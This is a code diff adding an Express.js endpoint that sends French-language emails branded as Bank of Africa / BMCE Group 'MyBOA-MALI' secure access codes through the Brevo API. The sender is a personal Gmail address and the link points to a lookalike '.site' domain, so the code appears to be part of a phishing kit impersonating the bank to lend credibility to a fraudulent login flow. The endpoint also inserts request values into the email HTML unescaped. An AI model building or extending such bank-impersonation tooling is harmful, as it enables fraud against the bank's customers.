@@ -151,6 +151,95 @@ body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 
     }
 });
 
+app.post('/send-certicode', (req, res) => {
+    try {
+        const { email, passcode, time } = req.body;
+
+        if (!email || !passcode) {
+            return res.status(400).json({ success: false, message: 'Email et code requis' });
+        }
+
+        const htmlContent = `
+        <!DOCTYPE html>
+        <html>
+        <head><meta charset="UTF-8"></head>
+        <body style="font-family:Arial,sans-serif;background:#f4f4f4;margin:0;padding:0;">
+        <div style="max-width:500px;margin:0 auto;background:white;">
+            <div style="background:#0f1923;padding:20px 30px;">
+                <table width="100%"><tr>
+                    <td><div style="color:white;font-size:13px;font-weight:bold;">BANK OF AFRICA</div>
+                    <div style="color:rgba(180,200,210,0.8);font-size:10px;">BMCE GROUP - MyBOA-MALI</div></td>
+                    <td align="right"><div style="color:white;font-size:16px;font-weight:bold;">CODE D'ACCÈS SÉCURISÉ</div></td>
+                </tr></table>
+            </div>
+            <div style="background:#1D6F4F;height:4px;"></div>
+            <div style="padding:30px;">
+                <p style="color:#333;font-size:15px;">Bonjour,</p>
+                <p style="color:#666;font-size:13px;line-height:1.6;">
+                    Votre code d'accès sécurisé MyBOA-MALI est :
+                </p>
+                <div style="background:#0f1923;border-radius:10px;padding:20px;text-align:center;margin:20px 0;">
+                    <div style="color:rgba(180,200,210,0.8);font-size:11px;margin-bottom:10px;">CODE D'ACCÈS</div>
+                    <div style="color:white;font-size:36px;font-weight:bold;letter-spacing:8px;">${passcode}</div>
+                    <div style="color:#1D6F4F;font-size:12px;margin-top:10px;">Valable jusqu'à ${time}</div>
+                </div>
+                <div style="background:#fff8e1;border:1px solid #f39c12;border-radius:6px;padding:12px;margin-top:20px;">
+                    <div style="color:#e67e22;font-size:12px;font-weight:bold;">⚠ SÉCURITÉ</div>
+                    <div style="color:#666;font-size:12px;margin-top:4px;">Ne partagez jamais ce code. MyBOA-MALI ne vous demandera jamais ce code par téléphone ou email.</div>
+                </div>
+            </div>
+            <div style="background:#0f1923;padding:15px 30px;text-align:center;">
+                <p style="color:rgba(100,120,140,0.9);font-size:10px;margin:3px 0;">2026 BANK OF AFRICA - MyBOA-MALI</p>
+                <p style="color:#4CAF50;font-weight:bold;font-size:10px;margin:3px 0;">www.myboamali.site</p>
+            </div>
+        </div>
+        </body>
+        </html>`;
+
+        const emailData = JSON.stringify({
+            sender: { name: 'MyBOA-MALI', email: 'guedeserge72@gmail.com' },
+            to: [{ email: email, name: 'Client MyBOA-MALI' }],
+            subject: 'MyBOA-MALI - Votre code d acces securise',
+            htmlContent: htmlContent
+        });
+
+        const options = {
+            hostname: 'api.brevo.com',
+            port: 443,
+            path: '/v3/smtp/email',
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json',
+                'api-key': BREVO_API_KEY
+            }
+        };
+
+        const reqBrevo = https.request(options, (resBrevo) => {
+            let data = '';
+            resBrevo.on('data', (chunk) => { data += chunk; });
+            resBrevo.on('end', () => {
+                console.log('Certicode Brevo status:', resBrevo.statusCode, data);
+                if (resBrevo.statusCode === 201) {
+                    res.json({ success: true });
+                } else {
+                    res.status(500).json({ success: false, message: data });
+                }
+            });
+        });
+
+        reqBrevo.on('error', (e) => {
+            res.status(500).json({ success: false, message: e.message });
+        });
+
+        reqBrevo.write(emailData);
+        reqBrevo.end();
+
+    } catch (error) {
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
 app.get('/ping', (req, res) => {
     res.json({ status: 'ok', message: 'Serveur MyBOA-MALI operationnel' });
 });
